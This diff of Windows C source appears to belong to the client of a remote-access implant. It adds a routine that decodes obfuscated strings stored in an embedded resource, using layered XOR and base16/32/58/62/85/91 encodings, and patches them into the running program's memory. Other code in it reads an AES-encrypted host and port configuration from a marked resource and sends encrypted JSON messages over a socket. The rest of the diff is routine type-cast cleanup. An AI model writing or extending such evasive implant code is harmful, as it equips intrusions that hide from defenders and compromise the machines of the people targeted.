@@ -18,7 +18,7 @@ char* base64_encode(const unsigned char* data, size_t input_length, size_t* outp
         free(out);
         return NULL;
     }
-    if (output_length) *output_length = out_len;
+    if (output_length) *output_length = (size_t)out_len;
     return out;
 }
 
@@ -32,7 +32,7 @@ unsigned char* base64_decode(const char* data, size_t input_length, size_t* outp
         free(out);
         return NULL;
     }
-    if (output_length) *output_length = out_len;
+    if (output_length) *output_length = (size_t)out_len;
     return out;
 }
 
@@ -46,10 +46,10 @@ char* str_replace(const char* orig, const char* rep, const char* with) {
     int count;
 
     if (!orig || !rep) return NULL;
-    len_rep = strlen(rep);
+    len_rep = (int)strlen(rep);
     if (len_rep == 0) return NULL;
     if (!with) with = "";
-    len_with = strlen(with);
+    len_with = (int)strlen(with);
 
     ins = (char*)orig;
     for (count = 0; (tmp = strstr(ins, rep)); ++count) {
@@ -57,12 +57,11 @@ char* str_replace(const char* orig, const char* rep, const char* with) {
     }
 
     tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);
-
     if (!result) return NULL;
 
     while (count--) {
         ins = strstr(orig, rep);
-        len_front = ins - orig;
+        len_front = (int)(ins - orig);
         tmp = strncpy(tmp, orig, len_front) + len_front;
         tmp = strcpy(tmp, with) + len_with;
         orig += len_front + len_rep;
@@ -73,9 +72,9 @@ char* str_replace(const char* orig, const char* rep, const char* with) {
 
 void str_trim(char* s) {
     char* p = s;
-    int l = strlen(p);
-    while (l > 0 && isspace(p[l - 1])) p[--l] = 0;
-    while (*p && isspace(*p)) ++p, --l;
+    int l = (int)strlen(p);
+    while (l > 0 && isspace((unsigned char)p[l - 1])) p[--l] = 0;
+    while (*p && isspace((unsigned char)*p)) ++p, --l;
     memmove(s, p, l + 1);
 }
 
@@ -93,7 +92,7 @@ void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) 
     cJSON_AddStringToObject(root, "payload", msg);
     char *json_msg = cJSON_PrintUnformatted(root);
 
-    char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, strlen(json_msg), g_session.key, g_session.iv);
+    char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, (size_t)strlen(json_msg), g_session.key, g_session.iv);
 
     cJSON *packet = cJSON_CreateObject();
     cJSON_AddStringToObject(packet, "data", encrypted);
@@ -119,38 +118,12 @@ void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) 
 }
 
 char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
-    BCRYPT_ALG_HANDLE hAlg = NULL;
-    BCRYPT_KEY_HANDLE hKey = NULL;
-    DWORD cbKeyBlob = 0, cbData = 0, cbResult = 0;
-    BYTE* pbKeyBlob = NULL;
-    BYTE* pbEncrypted = NULL;
-    char* out = NULL;
-
-    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0) != 0) return NULL;
-
-    // PEM -> DER (Wincrypt)
-    DWORD derLen = 0;
-    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
-        BYTE* der = malloc(derLen);
-        if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL)) {
-            if (BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, der, derLen, 0) != 0) {
-                // BCryptImportKeyPair might not like raw DER for RSA.
-                // Alternatively use CryptImportPublicKeyInfo.
-                // For simplicity in this env, we'll try to use BCRYPT_RSAPUBLIC_BLOB correctly or a helper.
-            }
-        }
-        free(der);
-    }
-
-    // Since BCryptImportKeyPair is tricky with PEM/DER directly,
-    // let's use the older but reliable Crypt32 for RSA encryption or
-    // convert DER to BCRYPT_RSAKEY_BLOB.
-
-    // Easier way: Use Crypt32 for RSA encryption as it handles PEM/DER better.
     CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL;
     DWORD pubKeyInfoLen = 0;
     HCRYPTPROV hProv = 0;
     HCRYPTKEY hRSAKey = 0;
+    DWORD derLen = 0;
+    char* out = NULL;
 
     if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
         BYTE* der = malloc(derLen);
@@ -159,14 +132,11 @@ char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubke
             if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                 if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
                     DWORD encLen = (DWORD)len;
-                    // Get required size
                     if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
                         BYTE* encBuf = malloc(encLen);
-
                         memcpy(encBuf, data, len);
                         DWORD dataLen = (DWORD)len;
                         if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
-                            // Reverse output for Big Endian compatibility with Go
                             for (DWORD i = 0; i < dataLen / 2; i++) {
                                 BYTE temp = encBuf[i];
                                 encBuf[i] = encBuf[dataLen - 1 - i];
@@ -184,8 +154,6 @@ char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubke
         }
         free(der);
     }
-
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return out;
 }
 
@@ -198,23 +166,16 @@ char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned
 
     if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
     if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
-
     if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
     pbKeyObject = (PBYTE)malloc(cbKeyObject);
     if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
 
     BYTE ivCopy[16];
     memcpy(ivCopy, iv, 16);
-
-    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) {
-        goto cleanup;
-    }
+    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
     pbCipherText = malloc(cbCipherText);
     memcpy(ivCopy, iv, 16);
-    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
-        goto cleanup;
-    }
-
+    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
     out = base64_encode(pbCipherText, cbResult, NULL);
 
 cleanup:
@@ -237,24 +198,18 @@ unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, cons
 
     if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
     if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
-
     if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
     pbKeyObject = (PBYTE)malloc(cbKeyObject);
     if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
 
     BYTE ivCopy[16];
     memcpy(ivCopy, iv, 16);
-
-    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) {
-        goto cleanup;
-    }
-    pbPlain = malloc(cbPlain + 1); // +1 for null terminator
+    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
+    pbPlain = (unsigned char*)malloc(cbPlain + 1);
     memcpy(ivCopy, iv, 16);
-    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
-        goto cleanup;
+    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) == 0) {
+        if (out_len) *out_len = (size_t)cbResult;
     }
-
-    if (out_len) *out_len = cbResult;
 
 cleanup:
     if (pbCipher) free(pbCipher);
@@ -291,27 +246,224 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
 
 char g_host[256] = {0};
 int g_port = 0;
+unsigned char g_xor_key[5] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};
+
+static int b16_val(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    return 0;
+}
+
+size_t base16_decode(const char* in, unsigned char* out) {
+    size_t len = strlen(in);
+    for (size_t i = 0; i < len / 2; i++) {
+        out[i] = (unsigned char)((b16_val(in[i * 2]) << 4) | b16_val(in[i * 2 + 1]));
+    }
+    return len / 2;
+}
+
+size_t base32_decode(const char* in, unsigned char* out) {
+    static const char ALPHABET[] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','2','3','4','5','6','7','\0'};
+    int buffer = 0, bits = 0;
+    size_t count = 0;
+    for (size_t i = 0; in[i]; i++) {
+        const char* p = strchr(ALPHABET, toupper((unsigned char)in[i]));
+        if (!p) continue;
+        buffer = (buffer << 5) | (int)(p - ALPHABET);
+        bits += 5;
+        if (bits >= 8) {
+            out[count++] = (unsigned char)((buffer >> (bits - 8)) & 0xFF);
+            bits -= 8;
+        }
+    }
+    return count;
+}
+
+size_t base58_decode(const char* in, unsigned char* out) {
+    static const char ALPHABET[] = {'1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','J','K','L','M','N','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z','\0'};
+    size_t out_len = 0;
+    for (size_t i = 0; in[i]; i++) {
+        const char* p = strchr(ALPHABET, in[i]);
+        if (!p) continue;
+        int carry = (int)(p - ALPHABET);
+        for (size_t j = 0; j < out_len; j++) {
+            carry += out[j] * 58;
+            out[j] = (unsigned char)(carry & 0xFF);
+            carry >>= 8;
+        }
+        while (carry) {
+            out[out_len++] = (unsigned char)(carry & 0xFF);
+            carry >>= 8;
+        }
+    }
+    for (size_t i = 0; in[i] == '1'; i++) out[out_len++] = 0;
+    for (size_t i = 0; i < out_len / 2; i++) {
+        unsigned char tmp = out[i];
+        out[i] = out[out_len - 1 - i];
+        out[out_len - 1 - i] = tmp;
+    }
+    return out_len;
+}
+
+size_t base62_decode(const char* in, unsigned char* out) {
+    static const char ALPHABET[] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','\0'};
+    size_t out_len = 0;
+    for (size_t i = 0; in[i]; i++) {
+        const char* p = strchr(ALPHABET, in[i]);
+        if (!p) continue;
+        int carry = (int)(p - ALPHABET);
+        for (size_t j = 0; j < out_len; j++) {
+            carry += out[j] * 62;
+            out[j] = (unsigned char)(carry & 0xFF);
+            carry >>= 8;
+        }
+        while (carry) {
+            out[out_len++] = (unsigned char)(carry & 0xFF);
+            carry >>= 8;
+        }
+    }
+    for (size_t i = 0; i < out_len / 2; i++) {
+        unsigned char tmp = out[i];
+        out[i] = out[out_len - 1 - i];
+        out[out_len - 1 - i] = tmp;
+    }
+    return out_len;
+}
+
+size_t base85_decode(const char* in, size_t in_len, unsigned char* out) {
+    size_t out_len = 0;
+    for (size_t i = 0; i < in_len; ) {
+        unsigned int val = 0;
+        int count = 0;
+        for (int j = 0; j < 5 && i < in_len; j++) {
+            val = val * 85 + (unsigned int)(in[i++] - '!');
+            count++;
+        }
+        if (count == 5) {
+            for (int j = 0; j < 4; j++) {
+                out[out_len + 3 - j] = (unsigned char)(val & 0xFF);
+                val >>= 8;
+            }
+            out_len += 4;
+        }
+    }
+    return out_len;
+}
+
+size_t base91_decode(const char* in, unsigned char* out) {
+    static const char ALPHABET[] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','!','#','$','%','&','(',')','*','+',',','.','/',':',';','<','=','>','?','@','[',']','^','_','`','{','|','}','~','\"','\0'};
+    unsigned int v = (unsigned int)-1, b = 0, count = 0;
+    size_t out_len = 0;
+    for (size_t i = 0; in[i]; i++) {
+        const char* p = strchr(ALPHABET, in[i]);
+        if (!p) continue;
+        if (v == (unsigned int)-1) v = (unsigned int)(p - ALPHABET);
+        else {
+            v += (unsigned int)(p - ALPHABET) * 91;
+            b |= v << count;
+            count += (v & 8191) > 88 ? 13 : 14;
+            do {
+                out[out_len++] = (unsigned char)(b & 0xFF);
+                b >>= 8;
+                count -= 8;
+            } while (count >= 8);
+            v = (unsigned int)-1;
+        }
+    }
+    return out_len;
+}
+
+void transparent_decryption() {
+    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
+    if (!hRes) return;
+    HGLOBAL hData = LoadResource(NULL, hRes);
+    if (!hData) return;
+    unsigned char* pData = (unsigned char*)LockResource(hData);
+    if (!pData) return;
+    unsigned char marker[16];
+    SET_MARKER(marker);
+    if (memcmp(pData, marker, 16) != 0) return;
+
+    int num_strings = *(int*)(pData + 16 + 2032);
+    if (num_strings <= 0) return;
+
+    unsigned char* string_table = pData + 16 + 2032 + 4;
+    unsigned char key = g_xor_key[4];
+    if (key == 0) return;
+
+    HMODULE hMod = GetModuleHandle(NULL);
+    for (int i = 0; i < num_strings; i++) {
+        unsigned char* entry = string_table + (i * 32);
+        DWORD rva = *(DWORD*)(entry);
+        DWORD orig_len = *(DWORD*)(entry + 4);
+        DWORD res_offset = *(DWORD*)(entry + 8);
+        int steps = *(int*)(entry + 12);
+        unsigned char* step_types = entry + 16;
+
+        if (rva == 0 || orig_len == 0 || orig_len > 8192) continue;
+
+        unsigned char* addr = (unsigned char*)hMod + rva;
+        MEMORY_BASIC_INFORMATION mbi;
+        if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
+            if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
+                DWORD old_protect;
+                if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
+                    static unsigned char buf[16384];
+                    unsigned char* encoded_data = pData + 16 + res_offset;
+                    DWORD enc_len = *(DWORD*)encoded_data;
+                    if (enc_len > 16384) enc_len = 16384;
+                    memcpy(buf, encoded_data + 4, enc_len);
+                    size_t cur_len = enc_len;
+
+                    for (int s = steps - 1; s >= 0; s--) {
+                        unsigned char type = step_types[s];
+                        static unsigned char tmp[16384];
+                        if (type == 0) { // XOR
+                            for (size_t k = 0; k < cur_len; k++) buf[k] ^= key;
+                        } else if (type == 1) { // B64
+                            size_t out_l;
+                            unsigned char* d = base64_decode((char*)buf, cur_len, &out_l);
+                            if (d) {
+                                if (out_l <= 16384) { memcpy(buf, d, out_l); cur_len = out_l; }
+                                free(d);
+                            }
+                        } else if (type == 2) { // B32
+                            buf[cur_len] = 0; cur_len = base32_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
+                        } else if (type == 3) { // B16
+                            buf[cur_len] = 0; cur_len = base16_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
+                        } else if (type == 4) { // B58
+                            buf[cur_len] = 0; cur_len = base58_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
+                        } else if (type == 5) { // B62
+                            buf[cur_len] = 0; cur_len = base62_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
+                        } else if (type == 6) { // B85
+                            cur_len = base85_decode((char*)buf, cur_len, tmp); memcpy(buf, tmp, cur_len);
+                        } else if (type == 7) { // B91
+                            buf[cur_len] = 0; cur_len = base91_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
+                        }
+                    }
+                    memcpy(addr, buf, (size_t)orig_len);
+                    VirtualProtect(addr, orig_len, old_protect, &old_protect);
+                }
+            }
+        }
+    }
+}
 
 void load_config_from_resource() {
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
     if (!hRes) return;
-
     HGLOBAL hData = LoadResource(NULL, hRes);
     if (!hData) return;
-
     unsigned char* pData = (unsigned char*)LockResource(hData);
     if (!pData) return;
-
     unsigned char marker[16];
     SET_MARKER(marker);
-
     if (memcmp(pData, marker, 16) != 0) return;
 
     unsigned char* encrypted_config = pData + 16;
     size_t config_len = 2032;
-
-    unsigned char key[32];
-    unsigned char iv[16];
+    unsigned char key[32], iv[16];
     memcpy(key, CONFIG_KEY, 32);
     memcpy(iv, CONFIG_IV, 16);
 
@@ -322,21 +474,16 @@ void load_config_from_resource() {
 
     if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
     if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
-
     if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
     pbKeyObject = (PBYTE)malloc(cbKeyObject);
     if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
 
     BYTE ivCopy[16];
     memcpy(ivCopy, iv, 16);
-
-    // Get plain text size
     if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) {
-        // Fallback for no padding
         cbPlain = (DWORD)config_len;
     }
-
-    pbPlain = malloc(cbPlain + 1);
+    pbPlain = (unsigned char*)malloc(cbPlain + 1);
     memcpy(ivCopy, iv, 16);
     if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0) == 0) {
         pbPlain[cbResult] = 0;
